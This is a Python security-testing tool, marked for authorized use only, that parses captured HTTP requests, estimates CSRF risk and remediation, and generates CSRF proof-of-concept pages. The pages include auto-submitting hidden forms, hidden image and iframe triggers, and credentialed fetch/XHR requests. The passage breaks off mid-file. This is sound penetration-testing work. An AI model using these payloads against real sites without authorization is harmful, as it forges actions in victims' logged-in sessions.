#!/usr/bin/env python3
"""
csrf_poc.py
===========

Professional CSRF PoC Generator & Analyzer
--------------------------------------------

A single-file, professional-grade tool for authorized security testing that:

  * Parses raw HTTP requests copied from Burp Suite (HTTP/1.1 and HTTP/2 style,
    CRLF or LF line endings).
  * Runs a CSRF likelihood analysis engine (auth model, tokens, SameSite,
    Origin/Referer validation, custom headers).
  * Generates multiple types of CSRF Proof-of-Concept payloads
    (auto-submit HTML form, GET, POST, multipart, JSON via fetch/XHR, iframe).
  * Produces professional reports in HTML and Markdown.
  * Offers a modern dark-themed Tkinter GUI (Request Analyzer / CSRF Analysis /
    Generated PoC / Reports tabs) as well as a full CLI / library mode.
  * Includes researcher utilities: request diffing, token entropy analysis,
    parameter mutation testing, and a lightweight project save/load format.

LEGAL / ETHICAL NOTICE
-----------------------
This tool is intended STRICTLY for authorized security testing (bug bounty
programs you are enrolled in, penetration tests you are contracted for, or
your own applications). It does not perform any exploitation against
external targets by itself -- it only analyzes a request you supply and
generates static PoC artifacts. You are responsible for using it lawfully
and with proper authorization.

Author: Moufez Khadhraoui
Contact: khadhraoui.moufez@gmail.com | Discord: moufez (server: https://discord.gg/UkUgdj2DPb) | Instagram: mou_fez
Python: 3.12+
License: MIT (adapt as you like)
"""

from __future__ import annotations

import argparse
import base64
import dataclasses
import html
import json
import logging
import math
import re
import sys
import time
import uuid
import urllib.parse
import xml.etree.ElementTree as ET
from collections import Counter
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Optional

# --------------------------------------------------------------------------
# Logging
# --------------------------------------------------------------------------

logger = logging.getLogger("csrfgen")


def setup_logging(verbose: bool = False) -> None:
    """Configure application-wide logging."""
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        datefmt="%H:%M:%S",
    )


# --------------------------------------------------------------------------
# Configuration
# --------------------------------------------------------------------------

DEFAULT_CONFIG: dict[str, Any] = {
    "app_name": "CSRF PoC Generator",
    "version": "2.0.0",
    "theme": "dark",
    "theme_name": "Dark+ (VSCode)",
    "history_limit": 50,
    "token_param_hints": [
        "csrf", "xsrf", "authenticity_token", "_token", "csrftoken",
        "csrfmiddlewaretoken", "requestverificationtoken", "anticsrf",
        "nonce", "state",
    ],
    "token_header_hints": [
        "x-csrf-token", "x-xsrf-token", "x-requested-with",
        "x-request-verification-token", "x-anti-csrf-token",
    ],
    "safe_methods": {"GET", "HEAD", "OPTIONS"},
}


def load_config(path: Optional[str] = None) -> dict[str, Any]:
    """Load a JSON config file, merging it over the defaults."""
    cfg = dict(DEFAULT_CONFIG)
    if path:
        p = Path(path)
        if p.exists():
            try:
                user_cfg = json.loads(p.read_text(encoding="utf-8"))
                cfg.update(user_cfg)
                logger.info("Loaded configuration from %s", path)
            except Exception as exc:  # noqa: BLE001
                logger.warning("Failed to load config %s: %s", path, exc)
        else:
            logger.warning("Config file %s not found, using defaults", path)
    return cfg


# --------------------------------------------------------------------------
# Exceptions
# --------------------------------------------------------------------------

class CSRFGenError(Exception):
    """Base exception for the tool."""


class RequestParseError(CSRFGenError):
    """Raised when a raw HTTP request cannot be parsed."""


# --------------------------------------------------------------------------
# Data model
# --------------------------------------------------------------------------

class BodyType(str, Enum):
    NONE = "none"
    URLENCODED = "application/x-www-form-urlencoded"
    MULTIPART = "multipart/form-data"
    JSON = "application/json"
    XML = "application/xml"
    TEXT = "text/plain"
    UNKNOWN = "unknown"


@dataclass
class MultipartField:
    name: str
    value: str
    filename: Optional[str] = None
    content_type: Optional[str] = None


@dataclass
class ParsedRequest:
    method: str
    scheme: str
    host: str
    path: str
    query_params: dict[str, str] = field(default_factory=dict)
    headers: dict[str, str] = field(default_factory=dict)
    cookies: dict[str, str] = field(default_factory=dict)
    body_type: BodyType = BodyType.NONE
    body_raw: str = ""
    body_params: dict[str, str] = field(default_factory=dict)
    multipart_fields: list[MultipartField] = field(default_factory=list)
    json_body: Any = None
    raw_request: str = ""

    @property
    def url(self) -> str:
        return f"{self.scheme}://{self.host}{self.path}"

    @property
    def all_params(self) -> dict[str, str]:
        merged: dict[str, str] = {}
        merged.update(self.query_params)
        merged.update(self.body_params)
        return merged


# --------------------------------------------------------------------------
# HTTP request parser (Burp Suite compatible)
# --------------------------------------------------------------------------

class HTTPRequestParser:
    """Parses a raw HTTP request (as copied from Burp Suite) into a
    :class:`ParsedRequest`. Supports HTTP/1.1 and HTTP/2 pseudo-header style
    requests, CRLF and LF line endings, and common body encodings."""

    def __init__(self, default_scheme: str = "https") -> None:
        self.default_scheme = default_scheme

    def parse(self, raw: str) -> ParsedRequest:
        if not raw or not raw.strip():
            raise RequestParseError("Empty request")

        original_raw = raw
        normalized = raw.replace("\r\n", "\n").replace("\r", "\n")

        # Split head / body on first blank line
        if "\n\n" in normalized:
            head, body = normalized.split("\n\n", 1)
        else:
            head, body = normalized, ""

        lines = [l for l in head.split("\n") if l != ""]
        if not lines:
            raise RequestParseError("Missing request line")

        request_line = lines[0]
        headers_lines = lines[1:]

        method, path, scheme = self._parse_request_line(request_line, headers_lines)
        headers = self._parse_headers(headers_lines)

        host = self._extract_host(headers)
        if not host:
            raise RequestParseError("Host header/authority missing from request")

        cookies = self._parse_cookies(headers.get("cookie", ""))

        parsed_url = urllib.parse.urlparse(path)
        query_params = dict(urllib.parse.parse_qsl(parsed_url.query, keep_blank_values=True))
        clean_path = parsed_url.path or "/"

        content_type = headers.get("content-type", "")
        body_type = self._detect_body_type(content_type)

        body_params: dict[str, str] = {}
        multipart_fields: list[MultipartField] = []
        json_body: Any = None

        body = body.strip("\n")
        if body:
            if body_type == BodyType.URLENCODED:
                body_params = dict(urllib.parse.parse_qsl(body, keep_blank_values=True))
            elif body_type == BodyType.MULTIPART:
                boundary = self._extract_boundary(content_type)
                multipart_fields = self._parse_multipart(body, boundary) if boundary else []
                for f in multipart_fields:
                    if f.filename is None:
                        body_params[f.name] = f.value
            elif body_type == BodyType.JSON:
                try:
                    json_body = json.loads(body)
                    if isinstance(json_body, dict):
                        body_params = {k: self._stringify(v) for k, v in json_body.items()}
                except json.JSONDecodeError as exc:
                    logger.warning("Could not parse JSON body: %s", exc)
            elif body_type == BodyType.XML:
                try:
                    root = ET.fromstring(body)
                    body_params = self._flatten_xml(root)
                except ET.ParseError as exc:
                    logger.warning("Could not parse XML body: %s", exc)
            else:
                # text/plain or unknown - try urlencoded as a best effort fallback
                if "=" in body and body_type in (BodyType.TEXT, BodyType.UNKNOWN):
                    try:
                        body_params = dict(urllib.parse.parse_qsl(body, keep_blank_values=True))
                    except Exception:  # noqa: BLE001
                        body_params = {}

        return ParsedRequest(
            method=method,
            scheme=scheme,
            host=host,
            path=clean_path,
            query_params=query_params,
            headers=headers,
            cookies=cookies,
            body_type=body_type,
            body_raw=body,
            body_params=body_params,
            multipart_fields=multipart_fields,
            json_body=json_body,
            raw_request=original_raw,
        )

    # -- internal helpers ---------------------------------------------------

    def _parse_request_line(self, line: str, header_lines: list[str]) -> tuple[str, str, str]:
        parts = line.split(" ")
        if len(parts) < 2:
            raise RequestParseError(f"Malformed request line: {line!r}")
        method = parts[0].upper()
        path = parts[1]
        # HTTP/2 requests sometimes appear as ":method: GET" pseudo-headers
        # instead of a classic request line; detect and merge if present.
        for hl in header_lines:
            low = hl.lower()
            if low.startswith(":method:"):
                method = hl.split(":", 2)[-1].strip().upper()
            if low.startswith(":path:"):
                path = hl.split(":", 2)[-1].strip()
        scheme = self.default_scheme
        for hl in header_lines:
            if hl.lower().startswith(":scheme:"):
                scheme = hl.split(":", 2)[-1].strip()
        if not path.startswith("/") and "://" not in path:
            path = "/" + path
        return method, path, scheme

    def _parse_headers(self, header_lines: list[str]) -> dict[str, str]:
        headers: dict[str, str] = {}
        for line in header_lines:
            if line.startswith(":"):
                # HTTP/2 pseudo-header, e.g. :authority:
                stripped = line[1:]
                if ":" in stripped:
                    key, _, value = stripped.partition(":")
                    headers[f":{key.strip().lower()}"] = value.strip()
                continue
            if ":" not in line:
                continue
            key, _, value = line.partition(":")
            headers[key.strip().lower()] = value.strip()
        return headers

    def _extract_host(self, headers: dict[str, str]) -> Optional[str]:
        return headers.get("host") or headers.get(":authority")

    def _parse_cookies(self, cookie_header: str) -> dict[str, str]:
        cookies: dict[str, str] = {}
        if not cookie_header:
            return cookies
        for part in cookie_header.split(";"):
            part = part.strip()
            if not part or "=" not in part:
                continue
            k, _, v = part.partition("=")
            cookies[k.strip()] = v.strip()
        return cookies

    def _detect_body_type(self, content_type: str) -> BodyType:
        ct = content_type.lower()
        if "x-www-form-urlencoded" in ct:
            return BodyType.URLENCODED
        if "multipart/form-data" in ct:
            return BodyType.MULTIPART
        if "json" in ct:
            return BodyType.JSON
        if "xml" in ct:
            return BodyType.XML
        if "text/plain" in ct:
            return BodyType.TEXT
        if not ct:
            return BodyType.NONE
        return BodyType.UNKNOWN

    def _extract_boundary(self, content_type: str) -> Optional[str]:
        m = re.search(r"boundary=(?:\"([^\"]+)\"|([^;]+))", content_type)
        if not m:
            return None
        return (m.group(1) or m.group(2)).strip()

    def _parse_multipart(self, body: str, boundary: str) -> list[MultipartField]:
        fields: list[MultipartField] = []
        delimiter = f"--{boundary}"
        raw_parts = body.split(delimiter)
        for part in raw_parts:
            part = part.strip("\n").strip()
            if not part or part == "--":
                continue
            if "\n\n" not in part:
                continue
            part_headers, _, part_body = part.partition("\n\n")
            name_match = re.search(r'name="([^"]+)"', part_headers)
            filename_match = re.search(r'filename="([^"]*)"', part_headers)
            ct_match = re.search(r"Content-Type:\s*(.+)", part_headers, re.IGNORECASE)
            if not name_match:
                continue
            fields.append(
                MultipartField(
                    name=name_match.group(1),
                    value=part_body.strip(),
                    filename=filename_match.group(1) if filename_match else None,
                    content_type=ct_match.group(1).strip() if ct_match else None,
                )
            )
        return fields

    def _flatten_xml(self, elem: ET.Element, prefix: str = "") -> dict[str, str]:
        out: dict[str, str] = {}
        tag = f"{prefix}{elem.tag}" if not prefix else f"{prefix}.{elem.tag}"
        if list(elem):
            for child in elem:
                out.update(self._flatten_xml(child, tag))
        else:
            out[tag] = (elem.text or "").strip()
        return out

    def _stringify(self, value: Any) -> str:
        if isinstance(value, (dict, list)):
            return json.dumps(value)
        return str(value)


# --------------------------------------------------------------------------
# CSRF analysis engine
# --------------------------------------------------------------------------

class RiskLevel(str, Enum):
    HIGH = "High"
    MEDIUM = "Medium"
    LOW = "Low"
    INFO = "Info"


@dataclass
class CSRFFinding:
    risk: RiskLevel
    authentication: str
    csrf_token_detected: bool
    csrf_token_location: Optional[str]
    same_site: Optional[str]
    origin_validation: str
    referer_validation: str
    custom_header_required: bool
    protections_detected: list[str] = field(default_factory=list)
    recommendations: list[str] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)

    def summary_text(self) -> str:
        lines = [
            "--------------------------------",
            "CSRF Analysis Report",
            "--------------------------------",
            f"Risk: {self.risk.value}",
            f"Authentication: {self.authentication}",
            f"CSRF Token: {'Detected (' + self.csrf_token_location + ')' if self.csrf_token_detected else 'Not detected'}",
            f"SameSite cookie: {self.same_site or 'Unknown'}",
            f"Origin validation: {self.origin_validation}",
            f"Referer validation: {self.referer_validation}",
            f"Custom header required: {'Yes' if self.custom_header_required else 'No'}",
            f"Protections detected: {', '.join(self.protections_detected) or 'None'}",
            "Recommendations:",
        ]
        lines += [f"  - {r}" for r in self.recommendations] or ["  - None"]
        return "\n".join(lines)


class CSRFAnalyzer:
    """Heuristic analysis engine that estimates CSRF exploitability of a
    parsed request. This is a static, request-only analysis -- it does not
    contact the target and cannot fully confirm exploitability (which
    requires a live cross-origin test)."""

    def __init__(self, config: dict[str, Any]) -> None:
        self.config = config

    def analyze(self, req: ParsedRequest) -> CSRFFinding:
        auth = self._detect_auth(req)
        token_detected, token_location = self._detect_csrf_token(req)
        same_site = self._detect_samesite(req)
        origin_val = self._detect_origin_validation(req)
        referer_val = self._detect_referer_validation(req)
        custom_header = self._detect_custom_header(req)

        protections: list[str] = []
        if token_detected:
            protections.append("Synchronizer/Double-Submit token pattern (possible)")
        if same_site and same_site.lower() in ("strict", "lax"):
            protections.append(f"SameSite={same_site}")
        if custom_header:
            protections.append("Custom anti-CSRF header requirement")

        risk = self._score_risk(req, auth, token_detected, same_site, custom_header)

        recs: list[str] = []
        if not token_detected:
            recs.append("Implement a per-session CSRF token (synchronizer token pattern).")
        if not same_site or same_site.lower() == "none":
            recs.append("Set SameSite=Lax or Strict on session/auth cookies.")
        if origin_val == "Not validated / Unknown":
            recs.append("Validate the Origin header on state-changing requests server-side.")
        if referer_val == "Not validated / Unknown":
            recs.append("Validate the Referer header as a defense-in-depth measure.")
        if not custom_header:
            recs.append("Consider requiring a custom header (e.g. X-Requested-With) that simple HTML forms cannot set.")
        if req.method.upper() in self.config["safe_methods"]:
            recs.append("Ensure state-changing actions are never performed via safe (GET/HEAD) methods.")

        notes = []
        if req.method.upper() == "GET" and req.query_params:
            notes.append("State-changing GET request detected: trivially exploitable via <img>/<a> tags if authenticated by cookie alone.")

        return CSRFFinding(
            risk=risk,
            authentication=auth,
            csrf_token_detected=token_detected,
            csrf_token_location=token_location,
            same_site=same_site,
            origin_validation=origin_val,
            referer_validation=referer_val,
            custom_header_required=custom_header,
            protections_detected=protections,
            recommendations=recs,
            notes=notes,
        )

    # -- detection helpers ---------------------------------------------------

    def _detect_auth(self, req: ParsedRequest) -> str:
        if req.cookies:
            session_like = [k for k in req.cookies if re.search(r"sess|auth|token|jwt|sid", k, re.IGNORECASE)]
            if session_like:
                return f"Cookie based (candidate session cookies: {', '.join(session_like)})"
            return "Cookie based"
        if "authorization" in req.headers:
            scheme = req.headers["authorization"].split(" ")[0]
            return f"Header based ({scheme}) - typically NOT vulnerable to classic CSRF"
        return "No obvious authentication detected"

    def _detect_csrf_token(self, req: ParsedRequest) -> tuple[bool, Optional[str]]:
        hints = self.config["token_param_hints"]
        for name in req.all_params:
            if any(h in name.lower() for h in hints):
                return True, f"body/query parameter '{name}'"
        for name in req.headers:
            if any(h in name.lower() for h in self.config["token_header_hints"]):
                return True, f"header '{name}'"
        for name in req.cookies:
            if any(h in name.lower() for h in hints):
                return True, f"cookie '{name}' (double-submit candidate)"
        return False, None

    def _detect_samesite(self, req: ParsedRequest) -> Optional[str]:
        # SameSite is a Set-Cookie response attribute; a request alone cannot
        # confirm it. We surface this limitation instead of guessing.
        return None

    def _detect_origin_validation(self, req: ParsedRequest) -> str:
        if "origin" in req.headers:
            return "Origin header present in request (server-side validation unknown from request alone)"
        return "Not validated / Unknown"

    def _detect_referer_validation(self, req: ParsedRequest) -> str:
        if "referer" in req.headers or "referrer" in req.headers:
            return "Referer header present in request (server-side validation unknown from request alone)"
        return "Not validated / Unknown"

    def _detect_custom_header(self, req: ParsedRequest) -> bool:
        suspicious = [
            "x-requested-with", "x-csrf-token", "x-xsrf-token",
            "x-api-key", "x-auth-token",
        ]
        return any(h in req.headers for h in suspicious)

    def _score_risk(
        self,
        req: ParsedRequest,
        auth: str,
        token_detected: bool,
        same_site: Optional[str],
        custom_header: bool,
    ) -> RiskLevel:
        if "Header based" in auth and "NOT vulnerable" in auth:
            return RiskLevel.LOW
        if "No obvious authentication" in auth:
            return RiskLevel.INFO
        score = 0
        if not token_detected:
            score += 2
        if custom_header:
            score -= 2
        if req.method.upper() in self.config["safe_methods"]:
            score += 1
        if score >= 2:
            return RiskLevel.HIGH
        if score == 1:
            return RiskLevel.MEDIUM
        return RiskLevel.LOW


# --------------------------------------------------------------------------
# PoC generation
# --------------------------------------------------------------------------

class PoCType(str, Enum):
    AUTO_FORM = "auto_form"
    GET = "get"
    POST = "post"
    MULTIPART = "multipart"
    JSON_FETCH = "json_fetch"
    JSON_XHR = "json_xhr"
    IFRAME = "iframe"


def _esc_attr(value: str) -> str:
    return html.escape(str(value), quote=True)


class PoCGenerator:
    """Generates HTML/JS Proof-of-Concept payloads for a parsed request."""

    def __init__(self, req: ParsedRequest) -> None:
        self.req = req

    def editable_params(self) -> dict[str, str]:
        """Return the parameter set the user can edit before generation."""
        return dict(self.req.all_params)

    def generate(self, poc_type: PoCType, params: Optional[dict[str, str]] = None,
                 auto_submit: bool = True) -> str:
        params = params if params is not None else self.editable_params()
        generators = {
            PoCType.AUTO_FORM: self._auto_form,
            PoCType.GET: self._get_poc,
            PoCType.POST: self._post_poc,
            PoCType.MULTIPART: self._multipart_poc,
            PoCType.JSON_FETCH: self._json_fetch_poc,
            PoCType.JSON_XHR: self._json_xhr_poc,
            PoCType.IFRAME: self._iframe_poc,
        }
        fn = generators.get(poc_type)
        if not fn:
            raise CSRFGenError(f"Unknown PoC type: {poc_type}")
        return fn(params, auto_submit)

    # -- individual generators ------------------------------------------------

    def _form_inputs(self, params: dict[str, str]) -> str:
        return "\n".join(
            f'    <input type="hidden" name="{_esc_attr(k)}" value="{_esc_attr(v)}" />'
            for k, v in params.items()
        )

    def _auto_form(self, params: dict[str, str], auto_submit: bool) -> str:
        method = self.req.method.upper()
        if method == "GET":
            return self._get_poc(params, auto_submit)
        return self._post_poc(params, auto_submit)

    def _post_poc(self, params: dict[str, str], auto_submit: bool) -> str:
        submit_js = '  document.getElementById("csrfForm").submit();\n' if auto_submit else ""
        return f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC - POST {_esc_attr(self.req.path)}</title></head>
<body>
<!-- CSRF PoC generated for authorized security testing only -->
<form id="csrfForm" action="{_esc_attr(self.req.url)}" method="POST" enctype="application/x-www-form-urlencoded">
{self._form_inputs(params)}
  <input type="submit" value="Submit request" />
</form>
<script>
{submit_js}</script>
</body>
</html>
"""

    def _get_poc(self, params: dict[str, str], auto_submit: bool) -> str:
        query = urllib.parse.urlencode(params)
        target = f"{self.req.url}?{query}" if query else self.req.url
        auto = f'<script>window.location = "{_esc_attr(target)}";</script>' if auto_submit else ""
        return f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC - GET {_esc_attr(self.req.path)}</title></head>
<body>
<!-- CSRF PoC generated for authorized security testing only -->
<a id="csrfLink" href="{_esc_attr(target)}">Click to trigger request</a>
<img src="{_esc_attr(target)}" style="display:none" alt="" />
{auto}
</body>
</html>
"""

    def _multipart_poc(self, params: dict[str, str], auto_submit: bool) -> str:
        submit_js = '  document.getElementById("csrfForm").submit();\n' if auto_submit else ""
        return f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC - multipart {_esc_attr(self.req.path)}</title></head>
<body>
<!-- CSRF PoC generated for authorized security testing only -->
<form id="csrfForm" action="{_esc_attr(self.req.url)}" method="POST" enctype="multipart/form-data">
{self._form_inputs(params)}
  <input type="submit" value="Submit request" />
</form>
<script>
{submit_js}</script>
</body>
</html>
"""

    def _json_fetch_poc(self, params: dict[str, str], auto_submit: bool) -> str:
        body_json = json.dumps(params, indent=2)
        return f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC - JSON fetch {_esc_attr(self.req.path)}</title></head>
<body>
<!-- CSRF PoC generated for authorized security testing only -->
<!-- Note: JSON CSRF via fetch/XHR only works if the endpoint does NOT
     require a custom header AND accepts a simple content-type
     (e.g. text/plain) for the request, or CORS is misconfigured. -->
<script>
fetch("{_esc_attr(self.req.url)}", {{
  method: "{self.req.method.upper()}",
  credentials: "include",
  headers: {{ "Content-Type": "text/plain" }},
  body: JSON.stringify({body_json})
}});
</script>
</body>
</html>
"""

    def _json_xhr_poc(self, params: dict[str, str], auto_submit: bool) -> str:
        body_json = json.dumps(params, indent=2)
        return f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC - JSON XHR {_esc_attr(self.req.path)}</title></head>
<body>
<!-- CSRF PoC generated for authorized security testing only -->
<script>
var xhr = new XMLHttpRequest();
xhr.open("{self.req.method.upper()}", "{_esc_attr(self.req.url)}", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.send(JSON.stringify({body_json}));
</script>
</body>
</html>
"""

    def _iframe_poc(self, params: dict[str, str], auto_submit: bool) -> str:
        query = urllib.parse.urlencode(params)
        target = f"{self.req.url}?{query}" if query else self.req.url
        return f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC - iframe {_esc_attr(self.req.path)}</title></head>
<body>
<!-- CSRF PoC generated for authorized security testing only -->
<!-- iframe based PoC (useful for clickjacking-adjacent or silent GET triggers) -->
<iframe src="{_esc_attr(target)}" style="display:none" width="0" height="0"></iframe>
</body>
</html>
"""


# --------------------------------------------------------------------------
# Researcher utilities: diffing, token entropy, mutation testing
# --------------------------------------------------------------------------

def shannon_entropy(s: str) -> float:
    """Compute Shannon entropy (bits/char) of a string."""
    if not s:
        return 0.0
    counts = Counter(s)
    length = len(s)
    return -sum((c / length) * math.log2(c / length) for c in counts.values())


@dataclass
class TokenEntropyResult:
    parameter: str
    value: str
    entropy_bits_per_char: float
    length: int
    verdict: str


class TokenAnalyzer:
    """Analyzes candidate CSRF token values for entropy / predictability."""

    def __init__(self, config: dict[str, Any]) -> None:
        self.config = config

    def analyze_request(self, req: ParsedRequest) -> list[TokenEntropyResult]:
        hints = self.config["token_param_hints"]
        results = []
        for name, value in {**req.all_params, **req.cookies}.items():
            if any(h in name.lower() for h in hints) and value:
                results.append(self.analyze_value(name, value))
        return results

    def analyze_value(self, name: str, value: str) -> TokenEntropyResult:
        ent = shannon_entropy(value)
        if len(value) < 8:
            verdict = "Weak: token too short"
        elif ent < 2.5:
            verdict = "Weak: low entropy / predictable pattern"
        elif ent < 3.5:
            verdict = "Moderate entropy"
        else:
            verdict = "Strong entropy (good)"
        return TokenEntropyResult(
            parameter=name, value=value, entropy_bits_per_char=round(ent, 2),
            length=len(value), verdict=verdict,
        )


class RequestDiffer:
    """Compares two parsed requests and reports security-relevant differences."""

    def diff(self, a: ParsedRequest, b: ParsedRequest) -> dict[str, Any]:
        result: dict[str, Any] = {}
        result["method_changed"] = a.method != b.method
        result["host_changed"] = a.host != b.host
        result["path_changed"] = a.path != b.path

        headers_a, headers_b = set(a.headers), set(b.headers)
        result["headers_added"] = sorted(headers_b - headers_a)
        result["headers_removed"] = sorted(headers_a - headers_b)

        params_a, params_b = set(a.all_params), set(b.all_params)
        result["params_added"] = sorted(params_b - params_a)
        result["params_removed"] = sorted(params_a - params_b)
        result["params_changed_value"] = sorted(
            k for k in (params_a & params_b) if a.all_params[k] != b.all_params[k]
        )

        cookies_a, cookies_b = set(a.cookies), set(b.cookies)
        result["cookies_added"] = sorted(cookies_b - cookies_a)
        result["cookies_removed"] = sorted(cookies_a - cookies_b)

        # Highlight missing CSRF protections in b (e.g. token param disappeared)
        token_like = lambda names: [n for n in names if re.search(r"csrf|xsrf|token", n, re.IGNORECASE)]
        result["csrf_params_removed"] = token_like(result["params_removed"])
        result["csrf_headers_removed"] = token_like(result["headers_removed"])
        return result


class ParameterMutator:
    """Generates simple parameter mutations useful for manual CSRF/logic testing."""

    MUTATIONS = ["empty", "remove", "duplicate", "case_flip_key", "numeric_boundary"]

    def mutate(self, params: dict[str, str]) -> list[dict[str, str]]:
        mutated_sets: list[dict[str, str]] = []
        for key in params:
            base = dict(params)
            # empty value
            variant = dict(base); variant[key] = ""
            mutated_sets.append(variant)
            # remove key
            variant = dict(base); variant.pop(key, None)
            mutated_sets.append(variant)
            # flip key case
            variant = dict(base)
            value = variant.pop(key)
            variant[key.upper() if key.islower() else key.lower()] = value
            mutated_sets.append(variant)
            # numeric boundary if numeric
            if params[key].isdigit():
                variant = dict(base); variant[key] = str(int(params[key]) + 1)
                mutated_sets.append(variant)
                variant = dict(base); variant[key] = "-1"
                mutated_sets.append(variant)
        return mutated_sets


class EndpointCategorizer:
    """Very lightweight endpoint categorization heuristic based on path/params."""

    CATEGORIES = {
        "authentication": ["login", "logout", "signin", "signup", "register", "password"],
        "account_management": ["profile", "account", "settings", "email", "update"],
        "financial": ["transfer", "payment", "checkout", "withdraw", "invoice", "billing"],
        "admin": ["admin", "manage", "config", "role", "permission"],
        "social": ["comment", "post", "follow", "like", "share", "message"],
        "api": ["api/", "/v1/", "/v2/", "graphql"],
    }

    def categorize(self, req: ParsedRequest) -> str:
        haystack = f"{req.path} {' '.join(req.all_params)}".lower()
        for category, keywords in self.CATEGORIES.items():
            if any(kw in haystack for kw in keywords):
                return category
        return "uncategorized"


# --------------------------------------------------------------------------
# Report generation
# --------------------------------------------------------------------------

class ReportGenerator:
    """Builds professional HTML / Markdown reports combining request details,
    CSRF analysis, and generated PoC."""

    def __init__(self, req: ParsedRequest, finding: CSRFFinding, poc_html: str,
                 config: dict[str, Any]) -> None:
        self.req = req
        self.finding = finding
        self.poc_html = poc_html
        self.config = config

    def to_markdown(self) -> str:
        f = self.finding
        md = [
            f"# CSRF Analysis Report",
            "",
            f"**Generated:** {datetime.now().isoformat(timespec='seconds')}  ",
            f"**Tool:** {self.config['app_name']} v{self.config['version']}",
            "",
            "## Request Details",
            "",
            f"- **Method:** {self.req.method}",
            f"- **URL:** `{self.req.url}`",
            f"- **Body type:** {self.req.body_type.value}",
            f"- **Parameters:** {', '.join(self.req.all_params) or 'None'}",
            "",
            "## Vulnerability Analysis",
            "",
            f"- **Risk:** {f.risk.value}",
            f"- **Authentication:** {f.authentication}",
            f"- **CSRF Token:** {'Detected (' + f.csrf_token_location + ')' if f.csrf_token_detected else 'Not detected'}",
            f"- **SameSite:** {f.same_site or 'Unknown (response-header dependent)'}",
            f"- **Origin validation:** {f.origin_validation}",
            f"- **Referer validation:** {f.referer_validation}",
            f"- **Custom header required:** {'Yes' if f.custom_header_required else 'No'}",
            f"- **Protections detected:** {', '.join(f.protections_detected) or 'None'}",
            "",
            "## Impact",
            "",
            self._impact_text(),
            "",
            "## Evidence / Notes",
            "",
        ] + [f"- {n}" for n in f.notes] + [
            "",
            "## Generated Proof of Concept",
            "",
            "```html",
            self.poc_html.strip(),
            "```",
            "",
            "## Remediation",
            "",
        ] + [f"- {r}" for r in f.recommendations] + [
            "",
            "---",
            "*For authorized security testing only.*",
        ]
        return "\n".join(md)

    def to_html(self) -> str:
        f = self.finding
        risk_colors = {"High": "#e74c3c", "Medium": "#e67e22", "Low": "#27ae60", "Info": "#3498db"}
        color = risk_colors.get(f.risk.value, "#999")
        recs = "".join(f"<li>{html.escape(r)}</li>" for r in f.recommendations)
        notes = "".join(f"<li>{html.escape(n)}</li>" for n in f.notes) or "<li>None</li>"
        protections = ", ".join(f.protections_detected) or "None"
        params_list = ", ".join(self.req.all_params) or "None"
        return f"""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>CSRF Report - {_esc_attr(self.req.path)}</title>
<style>
  body {{ background:#1e1e2e; color:#e6e6e6; font-family: 'Segoe UI', Arial, sans-serif; padding:2rem; }}
  h1,h2 {{ color:#f5f5f5; border-bottom:1px solid #444; padding-bottom:.3rem; }}
  .badge {{ display:inline-block; padding:.25rem .75rem; border-radius:999px; background:{color}; color:#111; font-weight:bold; }}
  table {{ border-collapse: collapse; width:100%; margin:1rem 0; }}
  td, th {{ border:1px solid #444; padding:.5rem .75rem; text-align:left; }}
  pre {{ background:#111; padding:1rem; overflow:auto; border-radius:6px; }}
  code {{ color:#9cdcfe; }}
</style>
</head>
<body>
<h1>CSRF Analysis Report</h1>
<p>Generated: {datetime.now().isoformat(timespec='seconds')} &middot; {self.config['app_name']} v{self.config['version']}</p>
<h2>Risk: <span class="badge">{f.risk.value}</span></h2>

<h2>Request Details</h2>
<table>
<tr><th>Method</th><td>{html.escape(self.req.method)}</td></tr>
<tr><th>URL</th><td><code>{html.escape(self.req.url)}</code></td></tr>
<tr><th>Body type</th><td>{html.escape(self.req.body_type.value)}</td></tr>
<tr><th>Parameters</th><td>{html.escape(params_list)}</td></tr>
</table>

<h2>Vulnerability Analysis</h2>
<table>
<tr><th>Authentication</th><td>{html.escape(f.authentication)}</td></tr>
<tr><th>CSRF Token</th><td>{'Detected (' + html.escape(f.csrf_token_location) + ')' if f.csrf_token_detected else 'Not detected'}</td></tr>
<tr><th>SameSite</th><td>{html.escape(f.same_site or 'Unknown (response-header dependent)')}</td></tr>
<tr><th>Origin validation</th><td>{html.escape(f.origin_validation)}</td></tr>
<tr><th>Referer validation</th><td>{html.escape(f.referer_validation)}</td></tr>
<tr><th>Custom header required</th><td>{'Yes' if f.custom_header_required else 'No'}</td></tr>
<tr><th>Protections detected</th><td>{html.escape(protections)}</td></tr>
</table>

<h2>Impact</h2>
<p>{html.escape(self._impact_text())}</p>

<h2>Evidence / Notes</h2>
<ul>{notes}</ul>

<h2>Generated Proof of Concept</h2>
<pre><code>{html.escape(self.poc_html.strip())}</code></pre>

<h2>Remediation</h2>
<ul>{recs or '<li>None</li>'}</ul>

<hr/>
<p><em>For authorized security testing only.</em></p>
</body>
</html>
"""

    def _impact_text(self) -> str:
        if self.finding.risk == RiskLevel.HIGH:
            return ("An attacker who lures an authenticated victim to a malicious page "
                    "could likely force the victim's browser to perform this request, "
                    "leading to unauthorized state changes on the victim's behalf.")
        if self.finding.risk == RiskLevel.MEDIUM:
            return ("Some protections are present but may be insufficient or unverified; "
                    "further manual/cross-origin testing is recommended to confirm impact.")
        if self.finding.risk == RiskLevel.LOW:
            return "Existing protections likely mitigate classic CSRF against this endpoint."
        return "Insufficient information to determine authentication model or impact."


# --------------------------------------------------------------------------
# Project save/load (simple JSON project format)
# --------------------------------------------------------------------------

@dataclass
class HistoryEntry:
    id: str
    timestamp: str
    poc_type: str
    request_summary: str
    poc_html: str


class ProjectStore:
    """Simple JSON-backed project file: stores the raw request(s), analysis
    results, and PoC generation history."""

    def __init__(self, path: Path) -> None:
        self.path = path
        self.data: dict[str, Any] = {
            "requests": [],
            "history": [],
        }
        if path.exists():
            try:
